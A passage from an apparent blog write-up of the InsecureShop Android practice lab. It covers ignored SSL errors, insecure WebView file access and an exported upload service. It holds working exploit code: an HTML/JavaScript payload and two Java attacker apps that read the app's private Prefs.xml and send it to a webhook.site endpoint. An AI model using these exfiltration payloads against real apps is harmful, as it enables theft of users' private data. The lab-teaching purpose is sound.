data.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2016.png" alt="image.png" /></p><h2 id="lack-of-ssl-certificate-validation"><strong>Lack of SSL Certificate Validation</strong></h2><blockquote><p><strong>Description:</strong> The unsafe implementation of <code class="language-plaintext highlighter-rouge">OnReceived</code> SSL Error can be used to eavesdrop all the traffic loaded in WebView.</p></blockquote><p>Let’s search for the <code class="language-plaintext highlighter-rouge">OnReceived</code> method. We will find the <code class="language-plaintext highlighter-rouge">com.insecureshop.util.CustomWebViewClient</code> class, which has the following code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.insecureshop.util</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">CustomWebViewClient</span> <span class="kd">extends</span> <span class="nc">WebViewClient</span> <span class="o">{</span>
<span class="nd">@Override</span> <span class="c1">// android.webkit.WebViewClient</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceivedSslError</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="nc">SslErrorHandler</span> <span class="n">handler</span><span class="o">,</span> <span class="nc">SslError</span> <span class="n">error</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">handler</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">handler</span><span class="o">.</span><span class="na">proceed</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span> 
</pre></table></code></div></div><p>Let’s break it down:</p><ul><li><strong><code class="language-plaintext highlighter-rouge">CustomWebViewClient</code> Class</strong>: This class extends <code class="language-plaintext highlighter-rouge">WebViewClient</code>, which allows you to customize how a <code class="language-plaintext highlighter-rouge">WebView</code> (a component for displaying web pages) behaves when interacting with web content.<li><strong><code class="language-plaintext highlighter-rouge">onReceivedSslError</code> Method:</strong> This method is called when the <code class="language-plaintext highlighter-rouge">WebView</code> encounters an SSL error while loading a webpage.  The method checks if the <code class="language-plaintext highlighter-rouge">handler</code> is not null. If it is not null, it calls <code class="language-plaintext highlighter-rouge">handler.proceed()</code>.<li><strong><code class="language-plaintext highlighter-rouge">handler.proceed()</code></strong>: This method tells the <code class="language-plaintext highlighter-rouge">WebView</code> to ignore the SSL error and continue loading the page. By using <code class="language-plaintext highlighter-rouge">handler.proceed()</code>, this code effectively ignores all SSL errors, allowing potentially insecure connections to proceed.</ul><p>So here we have a vulnerability that allows the user to load any URL, ignoring the SSL errors and accepting to load any invalid certificates. This will make the application’s user vulnerable to MITM attacks. To create a POC for this attack, we need to know where this custom <code class="language-plaintext highlighter-rouge">CustomWebViewClient</code> is being used. By searching through the code, the <code class="language-plaintext highlighter-rouge">com.insecureshop.WebViewActivity</code> class is using it:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_webview</span><span class="o">);</span>
    <span class="n">webview</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">CustomWebViewClient</span><span class="o">());</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>Luckily, we have previously exploited a vulnerability in this WebView class that allowed us to load any URL. So, to combine with the SSL misconfiguration here, we need to use an invalid certificate. We can simply run burpsuite proxy and browse any HTTPS website. In normal cases, the browser should return an error and not load the website. But in our case, the code here is built to ignore errors and continue browsing. Let’s exploit the webview activity to load the following HTTPS URL:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">am</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">android.intent.action.VIEW</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">insecureshop://com.insecureshop/web</span><span class="nf">?</span><span class="nx">url</span><span class="o">=</span><span class="nx">https://itsfading.github.io</span><span class="w">
</span></pre></table></code></div></div><p>The normal behavior should be like that:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2017.png" alt="image.png" /></p><p>but in our case it is vulnerable and it worked successfully:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2018.png" alt="image.png" /></p><h2 id="insecure-webview-properties"><strong>Insecure WebView Properties</strong></h2><blockquote><p><strong>Description:</strong> Insecure WebView properties are enabled that can allow third-party apps to exfiltrate local data to remote domain.</p></blockquote><p>In the same class, <code class="language-plaintext highlighter-rouge">com.insecureshop.WebViewActivity</code> the <code class="language-plaintext highlighter-rouge">setAllowUniversalAccessFromFileURLs()</code> is being used. Enabling this setting allows malicious scripts loaded in a <code class="language-plaintext highlighter-rouge">file://</code> context to launch cross-site scripting attacks, either accessing arbitrary local files, including WebView cookies, app private data or even credentials used on arbitrary web sites. We have already exploited this to load different URLs with <code class="language-plaintext highlighter-rouge">http://</code> and <code class="language-plaintext highlighter-rouge">https://</code> schemas. Now we have the ability to access internal files via the <code class="language-plaintext highlighter-rouge">file://</code> schema. But the objective here is to send the exfiltrated files to a remote domain. What we can do here is to craft an HTML file that dumps the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="c1">// Function to read the local file</span>
    <span class="kd">function</span> <span class="nf">readLocalFile</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// Create an XMLHttpRequest object</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">file:///data/data/com.insecureshop/shared_prefs/Prefs.xml</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="c1">// Set up the callback to handle the file content</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
            <span class="c1">// File content is in xhr.responseText</span>
            <span class="nf">sendToServer</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">Call sendToServer Function</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to read the file</span><span class="dl">"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="c1">// Send the request</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
    <span class="p">};</span>

    <span class="c1">// Function to send the file content to a remote server</span>
    <span class="kd">function</span> <span class="nf">sendToServer</span><span class="p">(</span><span class="nx">fileContent</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
        <span class="kd">var</span> <span class="nx">serverUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b/file?=</span><span class="dl">"</span><span class="o">+</span><span class="nx">fileContent</span><span class="p">;</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">serverUrl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">error again!!</span><span class="dl">"</span><span class="p">);</span>
            <span class="nf">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="c1">// Execute the function to read and exfiltrate the file</span>
    <span class="nf">readLocalFile</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Then we need to create an application that launches an Intent to exploit the <code class="language-plaintext highlighter-rouge">com.insecureshop.WebViewActivity</code> as we did before, but this time we will make to launch our <code class="language-plaintext highlighter-rouge">ex.html</code> file that will steal the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file and send it back to us.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// Read the HTML file from the assets</span>
        <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span>
                <span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getAssets</span><span class="o">().</span><span class="na">open</span><span class="o">(</span><span class="s">"ex.html"</span><span class="o">)));</span>
        <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
        <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">reader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="nc">String</span> <span class="n">readfile</span> <span class="o">=</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>

        <span class="c1">// Create a new file on the external storage</span>
        <span class="nc">File</span> <span class="n">payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="nc">Environment</span><span class="o">.</span><span class="na">getExternalStorageDirectory</span><span class="o">().</span><span class="na">getAbsolutePath</span><span class="o">(),</span> <span class="s">"ex.html"</span><span class="o">);</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"File"</span><span class="o">,</span> <span class="n">payload</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="c1">// Write the content to the new file</span>
        <span class="nc">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
        <span class="n">fos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">readfile</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="n">fos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// Start the vulnerable WebView activity</span>
        <span class="nc">Intent</span> <span class="n">webViewActivityIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"android.intent.action.VIEW"</span><span class="o">);</span>
        <span class="n">webViewActivityIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.WebViewActivity"</span><span class="o">);</span>
        <span class="n">webViewActivityIntent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"insecureshop://com.insecureshop/web?url=file://"</span><span class="o">+</span><span class="n">payload</span><span class="o">.</span><span class="na">toString</span><span class="o">()));</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="n">webViewActivityIntent</span><span class="o">);</span>

    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s break it down:</p><ul><li>The code starts by accessing an HTML file named <code class="language-plaintext highlighter-rouge">ex.html</code> located in the <code class="language-plaintext highlighter-rouge">assets</code> folder of my Android project. It reads the file line by line and appends each line to a <code class="language-plaintext highlighter-rouge">StringBuilder</code>. The resulting string, <code class="language-plaintext highlighter-rouge">readfile</code>, contains the entire contents of the HTML file.<li>After reading the HTML file from assets, the code creates a new file named <code class="language-plaintext highlighter-rouge">ex.html</code> on the device’s external storage.<li>It constructs a <code class="language-plaintext highlighter-rouge">File</code> object using the path to the external storage directory, which is retrieved with <code class="language-plaintext highlighter-rouge">Environment.getExternalStorageDirectory().getAbsolutePath()</code>.<li>The content of <code class="language-plaintext highlighter-rouge">readfile</code> is then written to this new file using a <code class="language-plaintext highlighter-rouge">FileOutputStream</code>.</ul><p>Note that the following permission has been given to my application to be able to write the <code class="language-plaintext highlighter-rouge">ex.html</code> on the device’s external storage.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span> <span class="nt">/&gt;</span> 
</pre></table></code></div></div><ul><li>The code creates an <code class="language-plaintext highlighter-rouge">Intent</code> to start the <code class="language-plaintext highlighter-rouge">WebViewActivity</code> in the <code class="language-plaintext highlighter-rouge">com.insecureshop</code> package.<li>It sets the <code class="language-plaintext highlighter-rouge">data</code> of the intent to a <code class="language-plaintext highlighter-rouge">Uri</code> that points to the newly created HTML file on external storage (<code class="language-plaintext highlighter-rouge">file://</code> URI). This instructs the <code class="language-plaintext highlighter-rouge">WebViewActivity</code> to load the HTML file when it starts.</ul><p>Successfully, we were able to steal the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> from the local device to a remote server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2019.png" alt="image.png" /></p><h2 id="using-components-with-known-vulnerabilities"><strong>Using Components with Known Vulnerabilities</strong></h2><blockquote><p><strong>Description:</strong> Identify the vulnerable components or libraries used in the app that can allow you to exfiltrate local files to remote domain.</p></blockquote><p>It appears that the application contains a vulnerable upload service library called <code class="language-plaintext highlighter-rouge">net.gotev.uploadservice</code> and it is being exported in the <code class="language-plaintext highlighter-rouge">androidManfiest.xml</code>:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;service</span> <span class="na">android:name=</span><span class="s">"net.gotev.uploadservice.UploadService"</span> <span class="na">android:enabled=</span><span class="s">"true"</span> <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><p>It appears that there is a public report on Hackerone exploiting this service:</p><p><a href="https://hackerone.com/reports/258460">Quora disclosed on HackerOne: [Quora Android] Possible to steal…</a></p><p>As the report says, this service, since it is exported, can allow any application installed on the same device to use it to steal any files from the vulnerable application directory, in our case, <code class="language-plaintext highlighter-rouge">/data/data/com.insecureshop</code>. I will create a new exploit application and add the vulnerable library code to my exploit app. The following is the link for the vulnerable version used in the Insecureapp <code class="language-plaintext highlighter-rouge">android-upload-service-3.2.3</code>:</p><p><a href="https://github.com/gotev/android-upload-service/releases?page=4">https://github.com/gotev/android-upload-service/releases?page=4</a></p><p>At the beginning, you have to import this library into your code with by editing the <code class="language-plaintext highlighter-rouge">settings.gradle</code> and adding the dependencies to the <code class="language-plaintext highlighter-rouge">build.gradle</code> file:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">dependencyResolutionManagement</span> <span class="o">{</span>
<span class="n">repositoriesMode</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="nc">RepositoriesMode</span><span class="o">.</span><span class="na">FAIL_ON_PROJECT_REPOS</span><span class="o">)</span>
<span class="n">repositories</span> <span class="o">{</span>
    <span class="n">google</span><span class="o">()</span>
    <span class="n">mavenCentral</span><span class="o">()</span>
    <span class="n">maven</span> <span class="o">{</span> <span class="n">url</span> <span class="err">'</span><span class="nl">https:</span><span class="c1">//jitpack.io' }</span>
    <span class="n">jcenter</span><span class="o">()</span> <span class="c1">// Warning: this repository is going to shut down soon</span>
<span class="o">}</span>
<span class="o">}</span>
<span class="n">rootProject</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="s">"gotevUploadServiceExploit"</span>
<span class="n">include</span> <span class="err">'</span><span class="o">:</span><span class="n">app</span><span class="err">'</span>
</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">dependencies</span>
<span class="o">{</span>
    <span class="n">implementation</span> <span class="err">'</span><span class="n">com</span><span class="o">.</span><span class="na">github</span><span class="o">.</span><span class="na">gotev</span><span class="o">.</span><span class="na">android</span><span class="o">-</span><span class="n">upload</span><span class="o">-</span><span class="nl">service:uploadservice:</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">3</span><span class="err">'</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Finally, hit sync Gradle, then move to edit the POC provided by the Hackerone researcher and try to steal the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.insecureshopapp.gotevuploadserviceexploit</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">android.app.Activity</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">android.content.Intent</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">android.os.Bundle</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileNotFoundException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">net.gotev.uploadservice.HttpUploadTaskParameters</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">net.gotev.uploadservice.UploadFile</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">net.gotev.uploadservice.UploadTaskParameters</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">Activity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

    <span class="nc">UploadTaskParameters</span> <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UploadTaskParameters</span><span class="o">();</span>
    <span class="c1">// Random Id parameter</span>
    <span class="n">params</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="s">"18888998"</span><span class="o">);</span>
    
    <span class="c1">// Any Server URL to receive the local file</span>
    <span class="n">params</span><span class="o">.</span><span class="na">setServerUrl</span><span class="o">(</span><span class="s">"http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">params</span><span class="o">.</span><span class="na">addFile</span><span class="o">(</span><span class="k">new</span> <span class="nc">UploadFile</span><span class="o">(</span><span class="s">"/data/data/com.insecureshop/shared_prefs/Prefs.xml"</span><span class="o">));</span>
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"net.gotev.uploadservice.action.upload"</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"net.gotev.uploadservice.UploadService"</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"taskClass"</span><span class="o">,</span> <span class="s">"net.gotev.uploadservice.MultipartUploadTask"</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"multipartUtf8Charset"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"httpTaskParameters"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">HttpUploadTaskParameters</span><span class="o">());</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"taskParameters"</span><span class="o">,</span> <span class="n">params</span><span class="o">);</span>
        <span class="n">startService</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">FileNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalStateException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>And it wooorked!! Now we have a copy of the <code class="language-plaintext highlighter-rouge">Pref.xml</code> that should only be accessible by the <code class="language-plaintext highlighter-rouge">com.insecureshop</code> app as per Android security.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2020.png" alt="image.png" /></p><h2 id="arbitrary-code-execution"><strong>Arbitrary Code Execution</strong></h2><blockquote><p><strong>Description:</strong> Arbitrary Code Execution via third-party package contexts.</p></blockquote><p>Actually, this vulnerability took me lots of time to discover where it arises, as I was searching for any implicit intent that takes some command and executes it, and I found nothing. After that, I decided to search with the vulnerability name to check similar ones on the Internet, and I came across this link:</p><p><a href="https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts">Android: arbitrary code execution via third-party package contexts</a></p><p>I have found similar code in the <code class="language-plaintext highlighter-rouge">LoginActivity</code></p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="o">(</span><span class="nc">PackageInfo</span> <span class="n">info</span> <span class="o">:</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getInstalledPackages</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">packageName</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="na">packageName</span><span class="o">;</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">packageName</span><span class="o">,</span> <span class="s">"packageName"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">StringsKt</span><span class="o">.</span><span class="na">startsWith</span><span class="n">$default</span><span class="o">(</span><span class="n">packageName</span><span class="o">,</span> <span class="s">"com.insecureshopapp"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="o">(</span><span class="nc">Object</span><span class="o">)</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Context</span> <span class="n">packageContext</span> <span class="o">=</span> <span class="n">createPackageContext</span><span class="o">(</span><span class="n">packageName</span><span class="o">,</span> <span class="mi">3</span><span class="o">);</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">packageContext</span><span class="o">,</span> <span class="s">"packageContext"</span><span class="o">);</span>
            <span class="nc">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">packageContext</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"com.insecureshopapp.MainInterface"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getInstance"</span><span class="o">,</span> <span class="nc">Context</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
            <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="s">"packageContext.classLoad…      .invoke(null, this)"</span><span class="o">);</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"object_value"</span><span class="o">,</span> <span class="n">value</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
